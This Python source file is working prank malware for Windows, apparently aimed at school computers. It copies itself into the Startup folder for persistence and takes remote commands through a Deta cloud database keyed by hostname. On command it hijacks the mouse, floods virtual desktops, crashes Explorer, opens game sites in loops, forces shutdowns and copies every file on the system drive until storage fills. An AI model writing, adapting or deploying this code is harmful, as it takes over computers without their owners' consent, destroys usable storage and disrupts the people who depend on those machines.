import config
import deta
import keyboard
import mouse
import os
import random
import screeninfo
import shutil
import socket
import subprocess
import sys
import threading
import webbrowser


# Get Path and Name of Program
filepath = sys.argv[0]
if "\\" in filepath:
    filename = filepath.split("\\")[-1]
else:
    filename = filepath.split("/")[-1]


# Copy to startup folder
shutil.copy(filepath, os.path.join(os.getenv("appdata"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", filename))


# Get Hostname
host = socket.gethostname().lower()


# Set width and height
width = screeninfo.get_monitors()[0].width
height = screeninfo.get_monitors()[0].height


# Set system drive
sysdrive = os.getenv("systemdrive")


# Set funny urls
urls = [
    "https://www.innersloth.com/games/among-us-vr/",
    "https://www.innersloth.com/games/among-us/",
    "https://www.innersloth.com/games/the-henry-stickmin-collection/",
    "https://www.innersloth.com/games/dig2china/",
    "https://www.roblox.com/home",
    "https://www.minecraft.net/en-us",
    "https://www.epicgames.com/fortnite/en-US/home",
    "https://store.steampowered.com/"
]


# Threading Control Variables
do_mouse = True
do_duplicate = True
do_explorer = True
do_desktop = True
do_sus = True

# Thread Creation Variables
mouse_create = False
explorer_create = False
desktop_create = False
sus_create = False


# Connect to project and database
detaB = deta.Deta(config.api_key)
db = detaB.Base("command")


# Check if in database already
host_in_db = False
res = db.fetch()
for comp in res.items:
    if comp["key"] == host:
        host_in_db = True
        break


# Add to database if not in database
if not host_in_db:
    db.put({
        "desktop": 0,
        "duplicate": 0,
        "explorer": 0,
        "mouse": 0,
        "shutdown": 0,
        "sus": 0
    }, host)


# Good luck regaining control of your mouse :P
def mousem():
    while True:
        if do_mouse:
            mouse.move(random.randint(0, width), random.randint(0, height))


# Too many desktops
def desktop():
    while True:
        if do_desktop:
            keyboard.send("ctrl+cmd+d")


# Explorer Crash
def explorer():
    while True:
        if do_explorer:
            subprocess.Popen("explorer /select,"+sysdrive+":\\")


# Let's just say your storage won't be... well, living anymore
def duplicate():
    for a,b,c in os.walk(os.getenv("systemdrive")+"\\"):
        for i in c:
            if do_duplicate:
                try:
                    oldpath = a+"\\"+i
                    splitext = os.path.splitext(oldpath)
                    newpath = splitext[0]+" - copy" + splitext[1]
                    shutil.copy(oldpath, newpath)
                except:
                    continue


# ICT hates Games
def sus():
    while True:
        if do_sus:
            webbrowser.open(urls[random.randint(0, len(urls) - 1)])


# Main loop
while True:
    changed = False
    thisData = db.get(host)
    if thisData != None:
        if not "desktop" in thisData:
            thisData["desktop"] = 0
            changed = True
        if not "duplicate" in thisData:
            thisData["duplicate"] = 0
            changed = True
        if not "explorer" in thisData:
            thisData["explorer"] = 0
            changed = True
        if not "mouse" in thisData:
            thisData["mouse"] = 0
            changed = True
        if not "shutdown" in thisData:
            thisData["shutdown"] = 0
            changed = True
        if not "sus" in thisData:
            thisData["sus"] = 0
            changed = True
        if changed:
            db.put(thisData)
        if thisData["shutdown"] == 1:
            os.system("shutdown /s /f /t 0")
        if thisData["mouse"] == 1:
            do_mouse = True
            if not mouse_create:
                mouse_create = True
                for tIdx in range(50):
                    t = threading.Thread(target=mousem, daemon=True)
                    t.start()
        if thisData["desktop"] == 1:
            do_desktop = True
            if not desktop_create:
                for tIdx in range(50):
                    desktop_create = True
                    t = threading.Thread(target=desktop, daemon=True)
                    t.start()
        if thisData["explorer"] == 1:
            do_explorer = True
            if not explorer_create:
                for tIdx in range(50):
                    explorer_create = True
                    t = threading.Thread(target=explorer, daemon=True)
                    t.start()
        if thisData["sus"] == 1:
            do_sus = True
            if not sus_create:
                for tIdx in range(50):
                    sus_create = True
                    t = threading.Thread(target=sus, daemon=True)
                    t.start()
        if thisData["duplicate"] == 1:
            do_duplicate = True
            t = threading.Thread(target=duplicate, daemon=True)
            t.start()
        if thisData["desktop"] == 0:
            do_desktop = False
        if thisData["explorer"] == 0:
            do_explorer = False
        if thisData["sus"] == 0:
            do_sus = False
        if thisData["duplicate"] == 0:
            do_duplicate = False
        if thisData["mouse"] == 0:
            do_mouse = False